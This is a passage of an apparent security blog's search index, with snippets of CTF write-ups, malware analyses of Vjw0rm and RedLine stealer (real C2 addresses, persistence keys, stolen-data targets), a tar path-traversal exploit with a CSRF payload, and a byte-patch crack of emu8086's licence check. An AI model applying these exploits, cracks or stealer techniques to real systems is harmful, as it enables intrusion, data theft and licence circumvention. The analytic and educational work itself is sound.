0x75, 0x56, 0x33, 0x63, 0x68, 0x7d, 0x10, 0x14, 0x02, 0x3f, 0x63, 0x7f, 0x64, 0x7b, 0x0d, 0x05, 0x70, 0x3a, 0x7d, 0x60, 0x0c, 0x2f, 0x29, 0x4c, 0x08, 0x41, 0x77, 0x1f, 0x1b, 0x61, 0x53, 0x35, 0x78, 0x35, 0x3f}; string chars = &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&amp;amp;\\&#39;()*+,-./:;&amp;lt;=&amp;gt;?@[\\\\]^_`{|}~ \\t\\n\\r\\x0b\\x0c&quot;; for (int i = 1; i &amp;lt; 0x2f; i++){ for (int j = 0; j &amp;lt; chars.length(); j++) { char n_1 = x[i]; char n_2 = y[i]; char n_3 = chars[j]; char not_flag = 0; char res = 0; res = ~(n_1 | ~n_3) | ~(~n_1 | n_3); not_flag = not_flag | ~(~res | ~n_2) | ~(res | n_2); if (!not_flag) cout &amp;lt;&amp;lt; n_3; } } for(int i = 0; i &amp;lt; chars.length(); i++) { char val = char(0xffffffffffffff82); char last = chars[i]; char not_flag = 0; not_flag = not_flag | ~(last | val) | ~(~val | ~last); if (!not_flag) cout &amp;lt;&amp;lt; last; } return 0;}and the flag is LITCTF{Wh0_n33ds_a11_th0sE_f4ncy_1nstructions?}" }, { "title": "LIT CTF - rev/codetiger-orz", "url": "/posts/litctf-codetiger-orz/", "categories": "CTF, writeup", "tags": "reverse", "date": "2022-07-24 18:00:00 +0200", "snippet": "Lexington Informatics Tournament CTF 2022 - rev/codetiger-orzLexington Informatics Tournament CTF 2022 was held from the 22nd of July Until the 25th of the month, and we have participated under the team 0xcha0s, we have managed to solve multiple challenges. this challenge was solved 43 times in the 3 days.The challenge is a python script looking at it asks the user for 7 digit password to decrypt a message.from cryptography.fernet import Fernetimport base64alphabet = &#39;!&quot;#$%&amp;amp;\\&#39;()*+,-./0123456789:;&amp;lt;=&amp;gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\\\]^_`abcdefghijklmnopqrstuvwxyz{|}~&#39;payload = b&#39;&amp;lt;some data&amp;gt;&#39;def derivePassword(): kw = [&#39;~#+&#39;, &#39;v~s&#39;, &#39;r~st&#39;, &#39;%xvt#&#39;, &#39;st%tr%x\\&#39;t&#39;] userKeyInput = input(&#39;Enter the key: &#39;) # 7-digit integer try: retrievePasswordKey = list(map(int, list(userKeyInput))) # retrievePasswordKey = list(str(10*0) + len(kw[2]) + str(2**0) + len(kw[0]) + &#39;2&#39; + len(&quot;orz) + &#39;0&#39;) ct = kw[retrievePasswordKey[0]] + kw[retrievePasswordKey[1]] + kw[retrievePasswordKey[2]] + \\ kw[retrievePasswordKey[3]] + kw[retrievePasswordKey[4]] + \\ kw[retrievePasswordKey[5]] + kw[retrievePasswordKey[6]] # return ROT(ct, s) return &#39;defaultplaceholderkeystringabcde&#39; except: if max(list(map(int, list(userKeyInput)))) &amp;gt;= len(kw): print(&#39;Key digits out of range!&#39;) else: print(&#39;Invalid key format!&#39;) exit()key_str = derivePassword()key_base64 = base64.b64encode(key_str.encode())f = Fernet(key_base64)try: d = f.decrypt(payload)except: print(&#39;The provided key was not correct!\\nDECRYPTION FAILED.&#39;) exit()solution = d.decode() # decrypted solutionprint(solution)def ROT(ct, s): pt = &#39;&#39; for c in ct: index = alphabet.find(c) original_index = (index + s) % len(alphabet) pt = pt + alphabet[original_index] return pt# s = 1 (mod 2), s = 7 (mod 11), 7 &amp;lt; |s| &amp;lt; 29# ROT|s| used to create password ciphertextdef solutionDecrypt(cipher): cipher = cipher.split(&#39;\\n&#39;) def c(l): b = &#39;&#39; l = l.split() if len(l) &amp;gt; 0: for t in l: if t == &#39;codetiger&#39;: b += &#39;1&#39; elif t == &#39;orz&#39;: b += &#39;0&#39; return chr(int(b, 2)) else: return &#39;&#39; s = &#39;&#39; for l in cipher: s += c(l) return sBut the derivePassword function has a constant return no matter what you enter it will return the same value and some functions are never called like ROT and solutionDecrypt.And some comments are interesting # retrievePasswordKey = list(str(10*0) + len(kw[2]) + str(2**0) + len(kw[0]) + &#39;2&#39; + len(&quot;orz) + &#39;0&#39;) you will have to fix few erros and you will find the key 0413230 # return ROT(ct, s) and this replace the constant value the drivePassword return but we need to find the s #s = 1 (mod 2), s = 7 (mod 11), 7 &amp;lt; |s| &amp;lt; 29 and from this comment you can find s using a loop to find the number the match all cases s=-15After this you will call solutionDecrypt and print the resultSo the script will be like:from cryptography.fernet import Fernetimport base64alphabet = &#39;!&quot;#$%&amp;amp;\\&#39;()*+,-./0123456789:;&amp;lt;=&amp;gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\\\]^_`abcdefghijklmnopqrstuvwxyz{|}~&#39;payload = b&#39;&amp;lt;some data&amp;gt;&#39;def ROT(ct, s): pt = &#39;&#39; for c in ct: index = alphabet.find(c) original_index = (index + s) % len(alphabet) pt = pt + alphabet[original_index] return pt# s = 1 (mod 2), s = 7 (mod 11), 7 &amp;lt; |s| &amp;lt; 29# ROT|s| used to create password ciphertextdef derivePassword(): kw = [&#39;~#+&#39;, &#39;v~s&#39;, &#39;r~st&#39;, &#39;%xvt#&#39;, &#39;st%tr%x\\&#39;t&#39;] userKeyInput = &quot;0413230&quot; # 7-digit integer try: retrievePasswordKey = list(map(int, list(userKeyInput))) # retrievePasswordKey = list(str(10*0) + len(kw[2]) + str(2**0) + len(kw[0]) + &#39;2&#39; + len(&quot;orz) + &#39;0&#39;) ct = kw[retrievePasswordKey[0]] + kw[retrievePasswordKey[1]] + kw[retrievePasswordKey[2]] + \\ kw[retrievePasswordKey[3]] + kw[retrievePasswordKey[4]] + \\ kw[retrievePasswordKey[5]] + kw[retrievePasswordKey[6]] return ROT(ct, -15) # return &#39;defaultplaceholderkeystringabcde&#39; except Exception as e: print(e) if max(list(map(int, list(userKeyInput)))) &amp;gt;= len(kw): print(&#39;Key digits out of range!&#39;) else: print(&#39;Invalid key format!&#39;) exit()key_str = derivePassword()key_base64 = base64.b64encode(key_str.encode())f = Fernet(key_base64)try: d = f.decrypt(payload)except: print(&#39;The provided key was not correct!\\nDECRYPTION FAILED.&#39;) exit()solution = d.decode() # decrypted solutionprint(solution)def solutionDecrypt(cipher): cipher = cipher.split(&#39;\\n&#39;) def c(l): b = &#39;&#39; l = l.split() if len(l) &amp;gt; 0: for t in l: if t == &#39;codetiger&#39;: b += &#39;1&#39; elif t == &#39;orz&#39;: b += &#39;0&#39; return chr(int(b, 2)) else: return &#39;&#39; s = &#39;&#39; for l in cipher: s += c(l) return sprint(solutionDecrypt(solution))the flag: LITCTF{1m_73ry_6ad_a1_r3v_en9in33r1ing}" }, { "title": "LIT CTF - rev/You Know The Rules And So Do I", "url": "/posts/litctf-You_Know_The_Rules_And_So_Do_I/", "categories": "CTF, writeup", "tags": "reverse", "date": "2022-07-24 18:00:00 +0200", "snippet": "Lexington Informatics Tournament CTF 2022 - rev/You Know The Rules And So Do ILexington Informatics Tournament CTF 2022 was held from the 22nd of July Until the 25th of the month, and we have participated under the team 0xcha0s, we have managed to solve multiple challenges. this challenge was solved 10 times in the 3 days.Were are given 2 files one is an executable and the other is a BMP imageDiscovering the binaryWe were given an x64bit ELF executable.My first thought is that the binary has hidden the flag inside the image and I will need to reverse this process.And by decompiling the main function and analysing it:// open the filestream = fopen(&quot;flag.txt&quot;, &quot;r&quot;);if ( !stream ){ puts(&quot;Error: The flag file does not exist&quot;); exit(0);}// read the flagif ( !fread(ptr, 0x32uLL, 1uLL, stream) ){ puts(&quot;Error: The flag is too short&quot;); exit(0);}// convert it to bits arrayfor ( i = 0; i &amp;lt;= 49; ++i ){ for ( j = 0; j &amp;lt;= 7; ++j ) v22[8 * i + j] = (((int)(unsigned __int8)ptr[i] &amp;gt;&amp;gt; (7 - j)) &amp;amp; 1) != 0;}It will open flag.txt and read the flag then convert it to an array of bits.v20 = fopen(&quot;yougotrickrolled.bmp&quot;, &quot;r&quot;);v21 = fopen(&quot;yougotrickrolledChallenge.bmp&quot;, &quot;w&quot;);Then will open 2 files one contains the original image to read and the other will be written to it.for ( k = 0; k &amp;lt;= 137; ++k ){ fread(&amp;amp;v5, 1uLL, 1uLL, v20); fputc(v5, v21);}Then write the first 137 bytes without any changes.for ( m = 0; m &amp;lt;= 799; ++m ){ for ( n = 0; n &amp;lt;= 1199; ++n ) { for ( ii = 0; ii &amp;lt;= 2; ++ii ) fread(&amp;amp;grid[3600 * m + 3 * n + ii], 1uLL, 1uLL, v20); }}Then load the rest of the image in an array where m is the width and n is the height and ii is the color channelv12 = 0;v13 = 0;v14 = 0;for ( jj = 0; jj &amp;lt;= 399; ++jj ){ alter(&amp;amp;grid[3600 * v12 + 3 * v13], v14, v22[jj]); v3 = v14 + 1; v14 = (v14 + 1) / 24; v14 = v3 - 24 * v14; if ( v22[jj] ) ++v12; else ++v13;}unsigned __int8 alter(unsigned __int8 *grid_element, int a2, unsigned __int8 flag_bit){ unsigned __int8 *result; // rax result = &amp;amp;grid_element[a2 / 8]; *result ^= (flag_bit ^ (((int)*result &amp;gt;&amp;gt; (a2 % 8)) &amp;amp; 1)) &amp;lt;&amp;lt; (a2 % 8); return result;}Now to the interesting part it will loop over our flag and change the ith bit at the color channel with the flag bit the bit index will increment each loop and the color channel will increment every 8 bits (single char).If the written bit is one will change the width offset and if not will change the height offset.And after all of this writing the new byte to the output image.Solver scriptimage = open(&quot;yougotrickrolledChallenge.bmp&quot;, &#39;rb&#39;)image_data = image.read()image_data = image_data[138:]flag = &#39;&#39;flag_byte = &#39;&#39;color_channel_index = 0x = 0y = 0for I in range(408): if i &amp;gt; 0 and i % 8 == 0: flag += chr(int(flag_byte, 2)) flag_byte = &#39;&#39; color_channel_index += 1 image_byte = image_data[3600 * x + 3 * y + (color_channel_index % 3)] flag_bit = image_byte &amp;amp; 2 ** (i % 8) if flag_bit: x += 1 flag_byte += &#39;1&#39; else: y += 1 flag_byte += &#39;0&#39;print(flag)flag LITCTF{h0n3stly_im_n0t_sur3_1f_rick_r0ll3d_mys3lf}" }, { "title": "Vjw0rm", "url": "/posts/vjw0rm/", "categories": "Malware, worm", "tags": "real_sample, vbs, js", "date": "2022-07-14 18:00:00 +0200", "snippet": "Vjw0rmSample Url: https://bazaar.abuse.ch/We start with a js file the file is obfuscated as shown in the imageand at the end is some data that looks like base64 encoded but if you try to decode it directly it will fail.Image 1After using de4js to deobfuscate the scriptand follow looking at its logic it appears to replace each match of &amp;gt;&amp;lt; on the suspicious base46 with A the decode it.Image 2and the decoded payload reveals another js scriptImage 3This script will write a new js file at the%APPDATA%/spHAeMTgHF.js and run it the content of the file is the result of decoding base64 data.And will create a new vbs file at %TMP%/ejike.vbs and run it the content of the file is the result of decoding base64 data.I will start with the js file it is obfuscated as the first file so by replacing &amp;gt;&amp;lt; with A and base64 decode we found another js scriptThe new script includes some weird naming and needs to be analysedImage 4Cleaning it a bit and we can find what it does.For presistance it uses registry HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\YVBPFHTJIQ\\And it copies itself to the startup folderAnother registry that is used by this malware is HKCU\\vjw0rmThen a loop is started to communicate with the C2 in our case it was http://franmhort[.]duia[.]ro at port 8152 and path Vre/jvw0rm includes a few commands: Cl: terminate the script Sc: write file to %tmp% dir and run it Ex: eval JScript Rn: overwrite VN variable with a new value and re-run the script Un: it is not clear but appears to do something related to the registry key YVBPFHTJIQ could be updated RF: the same as ClLooking at the vbs file and it appears that this is the wormit will copy itself to startup, temp folders and add itself toHKEY_CURRENT_USER\\software\\microsoft\\windows\\currentversion\\run\\&amp;lt;script name&amp;gt;HKEY_LOCAL_MACHINE\\software\\microsof\\windows\\currentversion\\run\\&amp;lt;script name&amp;gt;then enumerate all files and folders on the system and create a shortcut for them and inject itself to run when each one is usedthe worm provides some ready function like a trojan: execute: run vbs scripts uninstall: remove the worm and reverse all that it did [could be used to build removal script] send: download file from c2 site-send: download file from any site recv: upload file to c2 enum-driver: enumerate drivers enum-faf: enumerate folder enum-process: enumerate processes cmd-shell: start cmd shell delete: delete file or folder exit-process: terminate process sleep: sleep ;)worm c2: host: 194.5.97.7 port: 4040" }, { "title": "Patching emu8086", "url": "/posts/emu8068_1/", "categories": "Patching, Fun", "tags": "", "date": "2022-06-04 18:00:00 +0200", "snippet": "OverviewEmu8086 combines an advanced source editor, assembler, disassembler, software emulator (Virtual PC) with debugger, and step by step tutorials. This program is extremely helpful for those who just begin to study assembly language. It compiles the source code and executes it on emulator step by step.InspectOnce you open the app you will see a registartion buttonmain windowClick the button will open a small window with another button to buy a license with the followin linkshttps://shopper.mycommerce.com/checkout/product/2189-7https://shopper.mycommerce.com/checkout/product/2189-9https://shopper.mycommerce.com/checkout/product/2189-11All of them are not working and i have done some search to make sure that this program is not maintained any moreLinksFishing out inspection by trying to register with dummy name and keyRegister with dummy keyx32gdbStart x32gdb while emu is running and attach it to the the debuggerAttach to debuggerSelect program to attachThen from select view -&amp;gt; Modules to list all the loaded modulesModulesAfter this double click emu8086.exeemu8086.exeNow right click search for -&amp;gt; current module -&amp;gt; string refrencesfind stringsSeaching for Wrong registartion key as this message was shown to usfind registartion stringDouble click it to show it in the program assembly and pressing Ctrl+A to analyze the moduleAnd notice there is a jump to the instruction just before our string usagejump destinationScrolling to the jump instruction and the jump is based on a value stored at the address 621470jump sourceRight click the address select follow in dump -&amp;gt; constant emu8086.00621470memory valueRight click the memory and search for refrencesFind RefrencesThe last refrence is looking promising ;)Refrences ListFollow it in assembly and here we find a function call just before it that took our username and key beforeAnd followed by 5 bytes before writing ax to the memoryVerification function callUsing online assembly to opcode defuse with this instruction mov ax, 0xFFFF to set value 0xFFFF at ax registerThe opcode of it is 66B8FFFF and this can be written into 4 bytes but we have 5 and leaving the last byte will misinterpret the next instruction so we batch it with 0x90 opcode of no operation nopTo edit press Ctrl+ePatch emuApply the patch and start the patched version and suddenly it is register to test but how did it knowsRegistered to testLooking at the emu files and file called reg.ini newly created and contain user name and key from our first attempAssume that it will read the file each time it start and check if username and key sotred in it are validChange the name at this file will change the name at the program ;)reg.inireg.iniCreate Patch With COpen the patched version with hxd and search for 66 B8 FF FF to get the offset of the them on the exehxdThe offset is 0x1DA69DoffsetWrite a c prgram to open the exe and move to our offsetunsigned char bytes[] = {0xB8, 0xFF, 0xFF, 0x90};int offset = 0x1DA69D;FILE *fileH = fopen (&quot;emu8086.exe&quot;, &quot;r+&quot;);fseek(fileH, offset, SEEK_SET)After this write our bytesfwrite(&amp;amp;bytes, sizeof(bytes), sizeof(bytes[0]), fileH)And for fun open reg.ini and write my name ;)char reg[] = &quot;username=Patched By Mahmoud Ramadan\\nregkey=x\\nq=100&quot;;FILE *fileH2 = fopen (&quot;reg.ini&quot;, &quot;w&quot;);fwrite(&amp;amp;reg, sizeof(reg), sizeof(reg[0]), fileH2)Find full patch code at emupatchTest the patch and it workspatch test" }, { "title": "RedLine Stealer", "url": "/posts/redline_stealer/", "categories": "Malware, Spyware", "tags": "real_sample, .net, exe", "date": "2022-05-29 18:00:00 +0200", "snippet": "OverviewSample URL: bazaar.abuseRedLine is a stealer malware that collects all information about the victim as passwords and credit card numbers.In this analysis, the goal is to discover the capabilities of the RedLine and its execution flow. if tarfile.is_tarfile(path):Basic Static AnalysisUsing Detect-it-easy and PeID: 32bit .net executable not packedChecking strings show some clear text this file was not obfuscatedAdvanced Static AnalysisdeobfuscationJust to make sure that the file is clearde4dot -f sample.exe clean_sample.exede4dot fixed some strings but not the huge dealSource Code AnalyzingOpening it int dnspy. The original EXE name was happy.exeLooking at the main method inside the program class to start following the execution.The first thing it Creates a new object of class entrypoint inside this class constructor some important values are initializedthis.IP = &quot;178.159.38.57:60668&quot;;this.ID = &quot;build&quot;;this.Message = &quot;&quot;;this.Key = &quot;&quot;;Connecting to C2Then run the execute method and pass the entrypoint instance a parameterIt will try to use the decryption method taking a string and key to get the IPThe method works as follows base64 decode the string xor the decoded string with the key base64 decode the xor string if any exception is raised the original string will be returnedAnd because the IP is not encrypted it will fail and return the same stringThis method would be important if the IP was encryptedContinue with the function create EndpointConnection object to create a channel with C2 and check the connection establishmentRecive SettingSend a request to c2 to send the settings that will control the execution flow of the malwareScanningArgs settings = new ScanningArgs();while (!endpointConnection.TryGetArgs(out settings)){ if (!endpointConnection.TryGetConnection()) { throw new Exception(); } Thread.Sleep(1000);}ScanningArgs class attributes that will hold the settingsScanBrowsersScanFilesScanFTPScanWalletsScanScreenScanTelegramScanVPNScanSteamScanDiscordScanFilesPathsBlockedCountryBlockedIPScanChromeBrowsersPathsScanGeckoBrowsersPathsCollect InformationBefore starting to collect data the malware check if this device is from the blocked country or blocked IPs that are located in the setting if not it will start gathering all the informationThis is the content of the scan result that will be sent to C2 Country City IPv4 ZipCode Hardware -&amp;gt; md5 hash for Environment.UserDomainName + Environment.UserName + SystemInfoHelper.GetSerialNumber() and replace - with space FileLocation -&amp;gt; path of the executed binary Language -&amp;gt; keyboard layouts TimeZone -&amp;gt; timezone :) OSVersion -&amp;gt; windows prodact name + (32 or 64)bit MachineName -&amp;gt; from Environment.UserName ScanDetails SystemHardwares -&amp;gt; List for CPUs and GPUs: Name Counter -&amp;gt; number of cores HardType -&amp;gt; 0 indicate CPU and 1 for GPU for RAM: Name is Total of RAM Counter -&amp;gt; ram size HardType -&amp;gt; 1 same as GPU InstalledBrowsers -&amp;gt; List NameOfBrowser PathOfFile -&amp;gt; absloute path of the browser Version Softwares -&amp;gt; List name[version] SecurityUtils -&amp;gt; List will search at the security center and security center2 for Antivirus, Anti-spyware and Firewall products the list contains the display name of the found product Processes -&amp;gt; List follows this format ID: {Process_Id}, Name: {Process_Name}, Commandline: {commandline that start the process} AvailableLanguages -&amp;gt; List of all installed input languages MessageClientFiles -&amp;gt; List of all files in user desktop Browsers: List BrowserName BrowserProfile Logins -&amp;gt; List URL Username Password Coockies -&amp;gt; List Host Http Path Secure Expires Name Value Autofills -&amp;gt; List Name Value CC -&amp;gt; list of credit cards HolderName Month -&amp;gt; expiration month Year -&amp;gt; expiration year Number ScannedFiles -&amp;gt; List list the files like MessageClientFiles but it retrieves the dirs to scan from settings.ScanFilesPaths FtpConnections -&amp;gt; List URL Username Password ScannedWallets -&amp;gt; List list of all founded wallets supported wallets: Armory, atomic, Coinomi, Electrum, Ethereum, Exodus, Guarda, jaxx, and a general rule to match wallets supported Browser Extensions: Yoroi, Tronlink, NiftyWallet, Metamask, MathWallet, Coinbase, BinanceChain, BraveWallet, GuardaWallet, EqualWallet, JaxxxLiberty, BitAppWallet, iWallet, Wombat, AtomicWallet, Mewcx, GuildWallet, SaturnWallet, RoninWallet GameChatFiles -&amp;gt; List if settings.ScanDiscord is true contains a list of discord tokens GameLauncherFiles -&amp;gt; List if settings.ScanSteam is true list of config files of steam Nord if settings.ScanVPN is true just an empty list Open if settings.ScanVPN is true for OpenVPN Proton if settings.ScanVPN is true for ProtonVPN Resolution -&amp;gt; screen size Monitor -&amp;gt; Screenshot of the screen ReleaseID -&amp;gt; for our case build SeenBefore -&amp;gt; check if the directory {LocalApplicationData}\\Yandex\\YaAddon exist and if not create itGet Remote TasksAfter sending the scanned data. RedLine Check if there was any update.include those 4 methods CommandLineUpdate DownloadUpdate DownloadAndExecuteUpdate OpenUpdateAdvanced Dynamic AnalysisRunning the sample at any.runIt sends 4 requests to C2 as shown in the figureC2 ConnectionsExamining the requests redline uses SOAP protocol to communicate with C2 and the data is sent as XML.Check connection requestSettingsInspecting the second request that retrieves settings and examining the responseYou can check the file from hereThe settings for this sample areScanBrowsers = trueScanFiles = trueScanFTP = trueScanWallets = trueScanScreen = trueScanTelegram = trueScanVPN = trueScanSteam = trueScanDiscord = trueScanFilesPaths = [ &quot;%userprofile%\\Desktop|*.txt,*.doc*,*key*,*wallet*,*seed*|0&quot;, &quot;%userprofile%\\Documents|*.txt,*.doc*,*key*,*wallet*,*seed*|0&quot;]BlockedCountry = []BlockedIP = []ScanChromeBrowsersPaths = [ &quot;%USERPROFILE%\\AppData\\Local\\Battle.net&quot;, &quot;%USERPROFILE%\\AppData\\Local\\Chromium\\User Data&quot;, &quot;%USERPROFILE%\\AppData\\Local\\Google\\Chrome\\User Data&quot;, &quot;%USERPROFILE%\\AppData\\Local\\Google(x86)\\Chrome\\User Data&quot;, &quot;%USERPROFILE%\\AppData\\Roaming\\Opera Software\\&quot;, &quot;%USERPROFILE%\\AppData\\Local\\MapleStudio\\ChromePlus\\User Data&quot;, &quot;%USERPROFILE%\\AppData\\Local\\Iridium\\User Data&quot;, &quot;%USERPROFILE%\\AppData\\Local\\7Star\\7Star\\User Data&quot;, &quot;%USERPROFILE%\\AppData\\Local\\CentBrowser\\User Data&quot;, &quot;%USERPROFILE%\\AppData\\Local\\Chedot\\User Data&quot;, &quot;%USERPROFILE%\\AppData\\Local\\Vivaldi\\User Data&quot;, &quot;%USERPROFILE%\\AppData\\Local\\Kometa\\User Data&quot;, &quot;%USERPROFILE%\\AppData\\Local\\Elements Browser\\User Data&quot;, &quot;%USERPROFILE%\\AppData\\Local\\Epic Privacy Browser\\User Data&quot;, &quot;%USERPROFILE%\\AppData\\Local\\uCozMedia\\Uran\\User Data&quot;, &quot;%USERPROFILE%\\AppData\\Local\\Fenrir Inc\\Sleipnir5\\setting\\modules\\ChromiumViewer&quot;, &quot;%USERPROFILE%\\AppData\\Local\\CatalinaGroup\\Citrio\\User Data&quot;, &quot;%USERPROFILE%\\AppData\\Local\\Coowon\\Coowon\\User Data&quot;, &quot;%USERPROFILE%\\AppData\\Local\\liebao\\User Data&quot;, &quot;%USERPROFILE%\\AppData\\Local\\QIP Surf\\User Data&quot;, &quot;%USERPROFILE%\\AppData\\Local\\Orbitum\\User Data&quot;, &quot;%USERPROFILE%\\AppData\\Local\\Comodo\\Dragon\\User Data&quot;, &quot;%USERPROFILE%\\AppData\\Local\\Amigo\\User\\User Data&quot;, &quot;%USERPROFILE%\\AppData\\Local\\Torch\\User Data&quot;, &quot;%USERPROFILE%\\AppData\\Local\\Yandex\\YandexBrowser\\User Data&quot;, &quot;%USERPROFILE%\\AppData\\Local\\Comodo\\User Data&quot;, &quot;%USERPROFILE%\\AppData\\Local\\360Browser\\Browser\\User Data&quot;, &quot;%USERPROFILE%\\AppData\\Local\\Maxthon3\\User Data&quot;, &quot;%USERPROFILE%\\AppData\\Local\\K-Melon\\User Data&quot;, &quot;%USERPROFILE%\\AppData\\Local\\Sputnik\\Sputnik\\User Data&quot;, &quot;%USERPROFILE%\\AppData\\Local\\Nichrome\\User Data&quot;, &quot;%USERPROFILE%\\AppData\\Local\\CocCoc\\Browser\\User Data&quot;, &quot;%USERPROFILE%\\AppData\\Local\\Uran\\User Data&quot;, &quot;%USERPROFILE%\\AppData\\Local\\Chromodo\\User Data&quot;, &quot;%USERPROFILE%\\AppData\\Local\\Mail.Ru\\Atom\\User Data&quot;, &quot;%USERPROFILE%\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data&quot;, &quot;%USERPROFILE%\\AppData\\Local\\Microsoft\\Edge\\User Data&quot;, &quot;%USERPROFILE%\\AppData\\Local\\NVIDIA Corporation\\NVIDIA GeForce Experience&quot;, &quot;%USERPROFILE%\\AppData\\Local\\Steam&quot;, &quot;%USERPROFILE%\\AppData\\Local\\CryptoTab Browser\\User Data&quot;]ScanGeckoBrowsersPaths = [ &quot;%USERPROFILE%\\AppData\\Roaming\\Waterfox&quot;, &quot;%USERPROFILE%\\AppData\\Roaming\\K-Meleon&quot;, &quot;%USERPROFILE%\\AppData\\Roaming\\Thunderbird&quot;, &quot;%USERPROFILE%\\AppData\\Roaming\\Comodo\\IceDragon&quot;, &quot;%USERPROFILE%\\AppData\\Roaming\\8pecxstudios\\Cyberfox&quot;, &quot;%USERPROFILE%\\AppData\\Roaming\\NETGATE Technologies\\BlackHaw&quot;, &quot;%USERPROFILE%\\AppData\\Roaming\\Moonchild Productions\\Pale Moon&quot;]Scan ResultsLooking at the third request that send 1.5MB Most of the data are the base64 encoded screenshotNothing was new all of the sent data was discussed beforeYou can check the file from hereRemote TasksAnalyzing the last request. No remote tasks were returned" }, { "title": "Acnologia Portal - Cyber Apocalypse CTF 2022", "url": "/posts/acnologia_portal/", "categories": "CTF, writeup", "tags": "web", "date": "2022-05-20 18:00:00 +0200", "snippet": "Acnologia PortalDifficulty: mediumCatigory: webThis is an unintended way and how i solve it during the CTF.DiscoveringLooking at the website page there is a normal login and signup.After create account found a button to submit a bug.First guess is XSS to steal admin cookie when reviewing the reported bug but id didnâ€™t work cookies are http only.report bug formCode ReviewLooking at the code found an interesting function extract_firmware.It is used to upload and extract tar file on a random generated file at the server static file.The function save the file using the given filename after joined to tmp without proper checking.You can menapulate filname or name of files inside tar.def extract_firmware(file): tmp = tempfile.gettempdir() path = os.path.join(tmp, file.filename) file.save(path) if tarfile.is_tarfile(path): tar = tarfile.open(path, &#39;r:gz&#39;) tar.extractall(tmp) rand_dir = generate(15) extractdir = f&quot;{current_app.config[&#39;UPLOAD_FOLDER&#39;]}/{rand_dir}&quot; os.makedirs(extractdir, exist_ok=True) for tarinfo in tar: name = tarinfo.name if tarinfo.isreg(): try: filename = f&#39;{extractdir}/{name}&#39; os.rename(os.path.join(tmp, name), filename) continue except: pass os.makedirs(f&#39;{extractdir}/{name}&#39;, exist_ok=True) tar.close() return True return FalseAnd this function only called from this route /firmware/upload that require admin previliges.@api.route(&#39;/firmware/upload&#39;, methods=[&#39;POST&#39;])@login_required@is_admindef firmware_update(): if &#39;file&#39; not in request.files: return response(&#39;Missing required parameters!&#39;), 401 extraction = extract_firmware(request.files[&#39;file&#39;]) if extraction: return response(&#39;Firmware update initialized successfully.&#39;) return response(&#39;Something went wrong, please try again!&#39;), 403Attacking Created a symlink file point to a flag.txt at the â€˜/â€™ln -s /flag.txt flagln.txt Create a custom tar file using arcname parameter to specify the name we want.import tarfiletar = tarfile.open(&quot;payload.tar.gz&quot;, &quot;w:gz&quot;)tar.add(name=&quot;flagln.txt&quot;, arcname=&quot;../app/application/static/flagln.txt&quot;)tar.close() Convert payload.tar.gz to base64 Send CSRF payload&amp;lt;script&amp;gt;payload = atob(&#39;H4sICPrDi2IC/3BheWxvYWQudGFyAO3UzYrCMBSG4ay9il5B/pp6dCG4dDm3ELQ6hVZFI/TyTWdgdCO6cEYY3wfCCSeBnM0XbbSZf8R+UcdVfVC/wn67Va0tw2U/9J31zquiV3/gdEzxkJ9X78lPii41XT1z46osfTUJoqfiKpHxSOHf09rE/X5YbbOMqdltTQ5EapZm3cZNu9WpT8/Iv4gM1Ullr+tP5l3wwUvIf0Hu5/Tn64X/muEZEzyQ/y5+drvT6ua9e+cAAAAAAAAAAAAAAADAC5wBT7HVYAAoAAA=&#39;)u8arr = new Uint8Array(payload.length)for(let i = 0; i &amp;lt; payload.length; i++) { u8arr[i] = payload.charCodeAt(i)}tar = new File([u8arr], &#39;payload.tar.gz&#39;, {type:&quot;application/gzip&quot;})var formData = new FormData()formData.append(&#39;file&#39;, tar)var request = new XMLHttpRequest()request.open(&quot;POST&quot;, &quot;/api/firmware/upload&quot;)request.send(formData)&amp;lt;/script&amp;gt; Open static/flagln.txt and it reads the flagflag" }, { "title": "NahamCon CTF 2022", "url": "/posts/nahamcon_ctf/", "categories": "CTF, writeup", "tags": "mobile, malware, reverse, miscellaneous, steganography, web", "date": "2022-04-30 18:00:00 +0200", "snippet": "WebPersonnelchallange descriptionflag = open(&quot;flag.txt&quot;).read()users = open(&quot;users.txt&quot;).read()users += flag@app.route(&quot;/&quot;, methods=[&quot;GET&quot;, &quot;POST&quot;])def index(): if request.method == &quot;GET&quot;: return render_template(&quot;lookup.html&quot;) if request.method == &quot;POST&quot;: name = request.form[&quot;name&quot;] setting = int(request.form[&quot;setting&quot;]) if name: if name[0].isupper(): name = name[1:] results = re.findall(r&quot;[A-Z][a-z]*?&quot; + name + r&quot;[a-z]*?\\n&quot;, users, setting) results = [x.strip() for x in results if x or len(x) &amp;gt; 1] return render_template(&quot;lookup.html&quot;, passed_results=True, results=results)The name is concatenated and used as regex for search for a patternso by entering the name as |flag{.*}|It will return all the strings any string starting with a capital letter followed by any number of small letters or flag format or word consisting of small lettersquery results flag{f0e659b45b507d8633065bbd2832c627}Reversebabyrevchallange descriptionlooking at the elf file v6 = __readfsqword(0x28u); printf(&quot;Welcome to baby&#39;s first rev! :&amp;gt;\\nPlease enter your username: &quot;); __isoc99_scanf(&quot;%s&quot;, s1); printf(&quot;Please enter your password: &quot;); __isoc99_scanf(&quot;%s&quot;, v5); if ( strcmp(s1, &quot;bossbaby&quot;) ) { printf(&quot;%s? I don&#39;t know you... stranger danger...&quot;, s1); exit(0); } puts(&quot;You&#39;re almost there!&quot;); if ( (unsigned int)sub_12AD(v5) == 38 ) printf(&quot;You&#39;re boss baby!&quot;);username is babyboss and the password is passed to Subroutine sub_12ADThe important part of this function is a call to function sub_1208 + 1then it compares the data stored at dword_4020 with the password ((void (__fastcall *)())((char *)&amp;amp;sub_1208 + 1))(); for ( i = 0; ; ++i ) { v4 = i; if ( v4 &amp;gt;= strlen(s) ) break; if ( dword_4020[i] == *((_DWORD *)v11 + i) ) ++v8; }this address wasnâ€™t recognized as code so you have to make a function at this location__int64 __fastcall sub_120D(const char *a1, __int64 a2){ int i; // [rsp+1Ch] [rbp-14h] for ( i = 0; i &amp;lt; strlen(a1); ++i ) *(_DWORD *)(4LL * i + a2) = (a1[i] &amp;lt;&amp;lt; ((char)i % 7)) + i * i; return a2;}extract bytes at dword_4020 and reverse the encryption done by sub_120Darr = [0x66, 0x0D9, 0x188, 0x341, 0x7C0, 0x6F9, 0x18A4, 0x95, 0x10A, 0x1D5, 0x37C, 0x3A9, 